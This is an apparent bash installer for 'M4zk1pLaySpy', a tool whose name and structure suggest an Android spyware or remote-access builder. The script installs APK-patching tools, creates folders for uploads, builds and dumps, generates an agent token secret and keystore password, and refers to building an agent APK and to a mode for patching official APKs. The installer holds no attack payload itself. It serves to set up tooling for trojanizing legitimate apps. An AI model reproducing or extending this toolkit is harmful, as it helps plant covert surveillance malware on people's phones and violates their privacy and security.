#!/usr/bin/env bash
# ============================================================
#  M4zk1pLaySpy — installer
#  Target: Kali · Ubuntu · Parrot · Debian · Arch · macOS
#  Pemakaian:
#     ./install.sh              # install penuh
#     MZK_SKIP_DEPS=1 ./install.sh   # lewati instalasi paket OS
# ============================================================
set -euo pipefail

R='\033[1;31m'; A='\033[1;33m'; G='\033[1;32m'; C='\033[1;36m'; N='\033[0m'
say(){  echo -e "${R}[M4ZK1PLAY]${N} $*"; }
ok(){   echo -e "${G}[ OK ]${N} $*"; }
warn(){ echo -e "${A}[WARN]${N} $*"; }
err(){  echo -e "${R}[GAGAL]${N} $*" >&2; }
step(){ echo -e "\n${C}── $* ──${N}"; }

cd "$(dirname "$0")" || { err "tidak bisa masuk direktori script"; exit 1; }

step "PRA-SYARAT"

OS="$(uname -s)"
ARCH="$(uname -m)"
say "Sistem: ${OS} ${ARCH}"

if [[ "$OS" != "Darwin" && "$OS" != "Linux" ]]; then
  err "OS belum didukung. Pakai Linux (Kali/Ubuntu/Parrot/Debian/Arch) atau macOS."
  exit 1
fi

if [[ "$OS" == "Linux" && "$(id -u)" -eq 0 ]]; then
  warn "Dijalankan sebagai root. Virtualenv akan dibuat di folder ini juga."
fi

command -v curl >/dev/null 2>&1 || warn "curl tidak ada — sebagian pengecekan bisa gagal"

step "PAKET SISTEM"

install_linux_deps() {
  if command -v apt-get >/dev/null 2>&1; then
    sudo apt-get update -qq || warn "apt update gagal (lanjut)"
    sudo apt-get install -y -qq \
      python3 python3-venv python3-pip python3-dev \
      apktool zipalign aapt libxml2-utils \
      openjdk-17-jdk-headless unzip zip curl git 2>/dev/null \
      || warn "sebagian paket apt gagal dipasang (lanjut)"
  elif command -v dnf >/dev/null 2>&1; then
    sudo dnf install -y python3 python3-pip apktool java-17-openjdk-headless \
      unzip zip curl git 2>/dev/null || warn "sebagian paket dnf gagal (lanjut)"
  elif command -v pacman >/dev/null 2>&1; then
    sudo pacman -Sy --noconfirm python python-pip apktool jdk17-openjdk \
      unzip zip curl git 2>/dev/null || warn "sebagian paket pacman gagal (lanjut)"
  else
    warn "manajer paket tidak dikenali. Pasang manual: python3, apktool, zipalign, jdk17"
  fi
}

install_mac_deps() {
  if ! command -v brew >/dev/null 2>&1; then
    err "Homebrew belum ada. Pasang dulu: https://brew.sh"
    exit 1
  fi
  brew install python@3.11 apktool openjdk@17 android-commandlinetools \
    unzip zip curl git 2>/dev/null || warn "sebagian paket brew gagal (lanjut)"
}

if [[ "${MZK_SKIP_DEPS:-0}" == "1" ]]; then
  warn "MZK_SKIP_DEPS=1 → instalasi paket OS dilewati"
elif [[ "$OS" == "Darwin" ]]; then
  install_mac_deps
else
  install_linux_deps
fi

step "VERIFIKASI TOOL"

missing_tools=0
for t in java keytool; do
  if command -v "$t" >/dev/null 2>&1; then ok "$t"; else warn "$t tidak ditemukan"; missing_tools=$((missing_tools+1)); fi
done

for t in apktool zipalign apksigner; do
  if command -v "$t" >/dev/null 2>&1; then
    ok "$t"
  else
    warn "$t tidak ditemukan — build/patch APK bisa gagal"
    missing_tools=$((missing_tools+1))
  fi
done

if command -v java >/dev/null 2>&1; then
  JV="$(java -version 2>&1 | head -n1)"
  case "$JV" in
    *'"17'*|*'"18'*|*'"19'*|*'"20'*|*'"21'*) ok "JDK sesuai ($JV)" ;;
    *) warn "JDK terdeteksi: $JV — disarankan 17 atau lebih baru" ;;
  esac
fi

[[ $missing_tools -gt 0 ]] && warn "$missing_tools tool belum tersedia. Mode 'Oprek APK resmi' butuh apktool + apksigner + zipalign."

step "PYTHON"

PY=""
for cand in python3.12 python3.11 python3.10 python3; do
  if command -v "$cand" >/dev/null 2>&1; then
    if "$cand" -c 'import sys; raise SystemExit(0 if sys.version_info >= (3,10) else 1)' 2>/dev/null; then
      PY="$cand"; break
    fi
  fi
done

if [[ -z "$PY" ]]; then
  err "Python 3.10+ tidak ditemukan."
  exit 1
fi
ok "Python: $("$PY" -V 2>&1)"

step "VIRTUALENV"

if [[ -d .venv ]]; then
  warn ".venv sudah ada — dibuat ulang biar bersih"
  rm -rf .venv
fi

"$PY" -m venv .venv || { err "gagal membuat virtualenv"; exit 1; }
# shellcheck disable=SC1091
source .venv/bin/activate
ok "Virtualenv aktif"

pip install --quiet --upgrade pip wheel || warn "upgrade pip gagal (lanjut)"
pip install --quiet -r requirements.txt || { err "instalasi dependensi Python gagal"; exit 1; }
ok "Dependensi Python terpasang"

step "STRUKTUR & DATA"

mkdir -p data/uploads data/builds data/dumps data/keys agent/prebuilt
for d in uploads builds dumps keys; do
  touch "data/$d/.keep"
done
ok "Folder data siap"

step "KONFIGURASI"

if [[ -f config.json ]]; then
  warn "config.json sudah ada — tidak ditimpa"
else
  if [[ ! -f config.example.json ]]; then
    err "config.example.json tidak ada. Repo tidak lengkap."
    exit 1
  fi
  cp config.example.json config.json
  SECRET="$("$PY" - <<'PYEOF'
import secrets
print(secrets.token_urlsafe(48))
PYEOF
)"
  KPASS="$("$PY" - <<'PYEOF'
import secrets
print(secrets.token_urlsafe(24))
PYEOF
)"
  "$PY" - "$SECRET" "$KPASS" <<'PYEOF'
import json, sys
path = "config.json"
data = json.load(open(path))
data["agent_token_secret"] = sys.argv[1]
data["keystore_pass"] = sys.argv[2]
json.dump(data, open(path, "w"), indent=2)
PYEOF
  chmod 600 config.json 2>/dev/null || true
  ok "config.json dibuat, secret + password keystore dirotasi"
fi

step "HAK EKSEKUSI"

for f in run.sh dev.sh; do
  [[ -f "$f" ]] && chmod +x "$f" && ok "$f executable" || warn "$f tidak ada"
done

if [[ -d scripts ]]; then
  chmod +x scripts/*.sh 2>/dev/null || true
  ok "scripts/*.sh executable"
else
  warn "folder scripts/ tidak ada"
fi

step "PREBUILT"

if [[ ! -f agent/prebuilt/agent.apk ]]; then
  warn "agent/prebuilt/agent.apk belum ada."
  echo "  Setelah install selesai jalankan: ./scripts/build-agent.sh"
else
  ok "agent.apk tersedia ($(du -h agent/prebuilt/agent.apk | cut -f1))"
fi

if [[ ! -f agent/prebuilt/template.apk ]]; then
  warn "agent/prebuilt/template.apk belum ada → mode 'Build Baru' belum bisa."
  echo "  Lihat agent/prebuilt/README.md untuk cara membuatnya."
fi

step "VERIFIKASI STRUKTUR"

if [[ -f scripts/verify.sh ]]; then
  chmod +x scripts/verify.sh 2>/dev/null || true
  bash scripts/verify.sh || warn "struktur belum lengkap — cek output di atas"
else
  warn "scripts/verify.sh tidak ada, verifikasi dilewati"
fi

PORT="$(.venv/bin/python - <<'PYEOF'
import json
try:
    print(json.load(open("config.json")).get("port", 8777))
except Exception:
    print(8777)
PYEOF
)"

echo
echo -e "${R}╔══════════════════════════════════════════════════╗${N}"
echo -e "${R}║${N}  INSTALASI SELESAI                               ${R}║${N}"
echo -e "${R}╚══════════════════════════════════════════════════╝${N}"
echo
echo -e "  Jalankan : ${G}./run.sh${N}"
echo -e "  Buka     : ${C}http://127.0.0.1:${PORT}${N}"
echo -e "  Lisensi  : ${A}M4ZK1PL4Y${N}"
echo
echo "  Langkah berikutnya:"
echo "   1. ./scripts/build-agent.sh   (isi agent/prebuilt)"
echo "   2. ./run.sh"
echo
echo -e "${A}Catatan:${N} mode 'Oprek APK resmi' bisa dipakai tanpa agent.apk."
echo
